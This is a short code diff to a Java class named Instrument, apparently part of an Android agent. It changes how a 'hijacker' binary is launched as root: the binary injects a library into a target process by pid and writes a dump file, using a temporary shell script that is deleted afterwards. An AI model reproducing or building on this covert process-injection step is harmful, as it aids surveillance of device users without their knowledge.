@@ -71,7 +71,14 @@ public class Instrument {
 		int pid = getProcessPid();
 		
 		if (pid > 0) {
-			Execute.executeRoot("\"" + path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\"" /*" -d\""*/);
+			// Run the injector
+			String scriptName = "ij";
+			String script = "#!/system/bin/sh\n";
+			script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath;
+			
+			Root.createScript(scriptName, script);
+			Execute.executeRoot(path + "/" + scriptName);
+			Root.removeScript(scriptName);
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getProcessPid): unable to get pid");
